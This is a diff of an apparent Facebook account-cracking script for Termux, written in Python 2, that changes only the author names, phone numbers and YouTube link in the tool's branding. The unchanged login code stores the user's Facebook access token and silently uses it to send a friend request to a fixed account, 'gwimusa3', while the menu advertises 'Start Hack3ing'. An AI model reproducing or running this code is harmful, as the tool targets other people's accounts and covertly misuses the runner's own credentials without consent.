@@ -55,7 +55,7 @@ logo = """
 \033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
 \033[0;39m╰━━━┻━━━┻━━━╯
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|TECHNICAL.AAHIL\033[0;31m║
 \033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
 \033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-7861-7861\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
@@ -77,9 +77,9 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 085691015635\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : +923407835162\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY AAHIL\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : AAHIL CREATIONSs\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY ZUBAIR\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : TECHNICAL ZUBAIR\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
 CorrectUsername = "rana"
@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UC6AgCBt6TzaYJDMNsW1WWBA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -192,7 +192,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update zubair"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
